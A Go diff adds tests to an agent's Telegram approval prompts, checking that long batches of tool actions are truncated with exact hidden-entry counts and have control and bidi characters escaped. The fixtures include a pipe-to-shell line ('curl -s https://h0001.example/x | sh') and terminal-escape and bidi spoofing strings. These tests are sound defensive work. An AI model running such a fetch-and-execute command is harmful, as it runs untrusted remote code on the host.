@@ -1,9 +1,13 @@
 package telegram
 
 import (
+	"fmt"
+	"math/rand/v2"
+	"regexp"
 	"strings"
 	"testing"
 	"time"
+	"unicode/utf8"
 
 	"github.com/BackendStack21/odek/internal/danger"
 )
@@ -123,5 +127,233 @@ func TestRED_DeniedBatchCardKeepsElidedVeto(t *testing.T) {
 	a.SetTrustAll(true)
 	if r4TrustAll(a) {
 		t.Fatal("a denied whole card lifted the veto of an approved shortened card")
+	}
+}
+
+var r4EntryRE = regexp.MustCompile(`^  \d+\. `)
+
+// r4Card builds a batch card the way the agent loop lays it out.
+func r4Card(n int, entry func(i int) string, note string) string {
+	var b strings.Builder
+	fmt.Fprintf(&b, "⚠️ %d tool actions require approval:\n\n", n)
+	for i := 0; i < n; i++ {
+		fmt.Fprintf(&b, "  %d. `shell` — `%s`\n", i+1, entry(i))
+	}
+	if note != "" {
+		b.WriteString("\n" + note + "\n")
+	}
+	return b.String()
+}
+
+func r4CurlEntry(i int) string {
+	return fmt.Sprintf("curl -s https://h%04d.example/x | sh; echo %s", i+1, strings.Repeat("z", 20))
+}
+
+// r4CardRows returns the rows shown inside the code fence of an approval text.
+func r4CardRows(text string) []string {
+	start := strings.Index(text, "```\n") + 4
+	end := strings.LastIndex(text, "\n```")
+	return strings.Split(text[start:end], "\n")
+}
+
+// r4Count reports how many numbered entries a card lists, the count its
+// hidden-entries line states (-1 when there is none) and how many such lines
+// it has.
+func r4Count(text string) (listed, hidden, markers int) {
+	hidden = -1
+	for _, l := range r4CardRows(text) {
+		var n int
+		if _, err := fmt.Sscanf(l, "… and %d more entries not shown", &n); err == nil {
+			hidden = n
+			markers++
+			continue
+		}
+		if r4EntryRE.MatchString(l) {
+			listed++
+		}
+	}
+	return
+}
+
+// A card longer than danger.DisplayMaxBytes states exactly how many entries
+// it leaves out: the count is taken from the entries, not from what is left
+// of the card after the display cap.
+func TestRED_HiddenEntryCountExactPastDisplayCap(t *testing.T) {
+	for _, n := range []int{1000, 3000} {
+		card := r4Card(n, r4CurlEntry, "")
+		if len(card) <= danger.DisplayMaxBytes {
+			t.Fatalf("card too small: %d", len(card))
+		}
+		text, elided := buildApprovalTextElided(danger.ToolBatchClass, card, "")
+		if !elided || len(text) > telegramMaxMsgLen || !utf8.ValidString(text) {
+			t.Fatalf("n=%d: elided=%v len=%d", n, elided, len(text))
+		}
+		listed, hidden, markers := r4Count(text)
+		if markers != 1 || hidden != n-listed {
+			t.Fatalf("n=%d: listed %d entries, hidden-entries line says %d (%d such lines), want %d", n, listed, hidden, markers, n-listed)
+		}
+	}
+}
+
+// The header and the batch-card note are shown and never counted as hidden
+// entries.
+func TestRED_HiddenEntryCountIgnoresCardNote(t *testing.T) {
+	note := danger.SanitizeInline("Sandbox network: none (commands cannot reach the internet)")
+	for _, n := range []int{60, 300} {
+		card := r4Card(n, r4CurlEntry, note)
+		text, elided := buildApprovalTextElided(danger.ToolBatchClass, card, "")
+		if !elided || len(text) > telegramMaxMsgLen {
+			t.Fatalf("n=%d: elided=%v len=%d", n, elided, len(text))
+		}
+		listed, hidden, _ := r4Count(text)
+		if hidden != n-listed {
+			t.Fatalf("n=%d: listed %d entries, hidden-entries line says %d, want %d", n, listed, hidden, n-listed)
+		}
+		rows := r4CardRows(text)
+		if !strings.HasSuffix(rows[0], fmt.Sprintf(" %d tool actions require approval:", n)) {
+			t.Fatalf("n=%d: header not shown first: %q", n, rows[0])
+		}
+		if rows[len(rows)-1] != note {
+			t.Fatalf("n=%d: note not shown last: %q", n, rows[len(rows)-1])
+		}
+	}
+}
+
+// r4CheckCard asserts what every batch card prompt guarantees: it fits
+// Telegram's limit as valid UTF-8 without raw control or bidi characters; a
+// card reported whole shows its last line; a loop-laid card of n entries
+// (n > 0) lists every entry or states exactly how many it leaves out, once.
+func r4CheckCard(t *testing.T, name, card string, n int, desc string) {
+	t.Helper()
+	text, elided := buildApprovalTextElided(danger.ToolBatchClass, card, desc)
+	if len(text) > telegramMaxMsgLen || !utf8.ValidString(text) {
+		t.Fatalf("%s: len=%d valid=%v", name, len(text), utf8.ValidString(text))
+	}
+	for _, r := range text {
+		if r != '\n' && r != '\t' && (r < 0x20 || r == 0x7f || (r >= 0x80 && r <= 0x9f) ||
+			(r >= 0x202a && r <= 0x202e) || (r >= 0x2066 && r <= 0x2069)) {
+			t.Fatalf("%s: raw control or bidi character U+%04X shown", name, r)
+		}
+	}
+	lines := strings.Split(strings.TrimSuffix(card, "\n"), "\n")
+	if !elided && !strings.Contains(text, batchDisplay(lines[len(lines)-1])) {
+		t.Fatalf("%s: reported whole but its last line is missing", name)
+	}
+	if n == 0 {
+		return
+	}
+	listed, hidden, markers := r4Count(text)
+	switch {
+	case markers == 0 && listed != n:
+		t.Fatalf("%s: lists %d of %d entries without a hidden-entries line", name, listed, n)
+	case markers > 1 || (markers == 1 && hidden != n-listed):
+		t.Fatalf("%s: lists %d of %d entries, %d hidden-entries lines saying %d", name, listed, n, markers, hidden)
+	case markers == 1 && !elided:
+		t.Fatalf("%s: entries left out but not reported elided", name)
+	}
+}
+
+// r4InlineEntry renders an entry as the agent loop does.
+func r4InlineEntry(i int, tool, resource string) string {
+	return fmt.Sprintf("  %d. `%s` — `%s`\n", i+1, danger.SanitizeInline(tool), danger.SanitizeInline(resource))
+}
+
+// Hostile and random batch cards keep every guarantee of r4CheckCard.
+func TestTelegramR4_BatchCardBoundHostileAndRandom(t *testing.T) {
+	header := func(n int) string { return fmt.Sprintf("⚠️ %d tool actions require approval:\n\n", n) }
+	{
+		var b strings.Builder
+		b.WriteString(header(4))
+		b.WriteString(r4InlineEntry(0, strings.Repeat("n", 5000), "ls"))
+		b.WriteString(r4InlineEntry(1, strings.Repeat("😀", 3000), strings.Repeat("`\\", 3000)))
+		b.WriteString(r4InlineEntry(2, "shell", strings.Repeat("\\", 100000)))
+		b.WriteString(r4InlineEntry(3, "shell", "echo LAST"))
+		r4CheckCard(t, "mixed", b.String(), 4, strings.Repeat("ü", 1000))
+	}
+	r4CheckCard(t, "one 100 KB entry", header(1)+r4InlineEntry(0, "shell", strings.Repeat("x", 100<<10)), 1, "")
+	r4CheckCard(t, "one raw 100 KB line", "  1. `shell` — `"+strings.Repeat("é`\\\x1b", 100<<10/5)+"`", 0, "")
+	for _, tc := range []struct {
+		name  string
+		entry func(i int) string
+	}{
+		{"1000 multi-byte", func(i int) string {
+			return r4InlineEntry(i, strings.Repeat("é", 50), strings.Repeat("`", 40)+strings.Repeat("中", 30))
+		}},
+		{"1000 backslash", func(i int) string { return r4InlineEntry(i, "s", strings.Repeat("\\", 4096)) }},
+		{"1000 control", func(i int) string { return r4InlineEntry(i, "shell", "\x1b[2K‮"+strings.Repeat("\x01", 200)) }},
+	} {
+		var b strings.Builder
+		b.WriteString(header(1000))
+		for i := 0; i < 1000; i++ {
+			b.WriteString(tc.entry(i))
+		}
+		r4CheckCard(t, tc.name, b.String(), 1000, "")
+		r4CheckCard(t, tc.name+" with note", b.String()+"\nSandbox network: none\n", 1000, strings.Repeat("d", 4000))
+	}
+
+	r := rand.New(rand.NewPCG(11, 12))
+	frags := []string{"a", "é", "中", "😀", "`", "\\", "\x1b", "‮", "\x00", " ", "curl -s https://x.example/", "\t", "\r"}
+	text := func(max int) string {
+		var b strings.Builder
+		for k := r.IntN(max + 1); k > 0; k-- {
+			f := frags[r.IntN(len(frags))]
+			b.WriteString(strings.Repeat(f, 1+r.IntN(8)))
+		}
+		return b.String()
+	}
+	for iter := 0; iter < 300; iter++ {
+		n := 1 + r.IntN(1200)
+		desc := text(r.IntN(3) * 100)
+		if r.IntN(2) == 0 {
+			var b strings.Builder
+			b.WriteString(header(n))
+			for i := 0; i < n; i++ {
+				b.WriteString(r4InlineEntry(i, text(4), text(r.IntN(3)*40)))
+			}
+			if r.IntN(2) == 0 {
+				b.WriteString("\n" + danger.SanitizeInline(text(20)) + "\n")
+			}
+			r4CheckCard(t, fmt.Sprintf("card iter %d n=%d", iter, n), b.String(), n, desc)
+			continue
+		}
+		// A single multi-line command prompted as a batch: lines of shell.
+		lines := make([]string, n)
+		for i := range lines {
+			lines[i] = text(r.IntN(3) * 20)
+		}
+		r4CheckCard(t, fmt.Sprintf("command iter %d lines=%d", iter, n), strings.Join(lines, "\n"), 0, desc)
+	}
+}
+
+// Every row of a batch card, whole or shortened, is shown with control and
+// bidi characters escaped, also when the card text did not go through
+// danger.SanitizeInline (a single multi-line command prompted as a batch).
+func TestTelegramR4_BatchCardEscapesWhatItShows(t *testing.T) {
+	hostile := "echo \x1b[2K\r ‮gnirts‬ ⁦x⁩ ​z\u0085"
+	entry := func(i int) string { return hostile + strings.Repeat("q", 30) + hostile }
+	cards := map[string]string{
+		"whole card":     r4Card(2, entry, ""),
+		"shortened card": r4Card(300, entry, ""),
+		"whole command":  "echo a\n" + hostile + "\necho b",
+		"long command":   strings.Repeat(hostile+"\n", 400) + "tail " + hostile,
+		"one huge line":  strings.Repeat(hostile, 4000),
+	}
+	for name, card := range cards {
+		text, _ := buildApprovalTextElided(danger.ToolBatchClass, card, "")
+		if len(text) > telegramMaxMsgLen || !utf8.ValidString(text) {
+			t.Fatalf("%s: len=%d valid=%v", name, len(text), utf8.ValidString(text))
+		}
+		for _, r := range text {
+			if r == '\n' {
+				continue
+			}
+			if r < 0x20 || r == 0x7f || (r >= 0x80 && r <= 0x9f) || r == 0x200b ||
+				(r >= 0x202a && r <= 0x202e) || (r >= 0x2066 && r <= 0x2069) {
+				t.Fatalf("%s: raw control or bidi character U+%04X shown", name, r)
+			}
+		}
+		if !strings.Contains(text, `\\x1b`) {
+			t.Fatalf("%s: escapes not visible", name)
+		}
 	}
 }
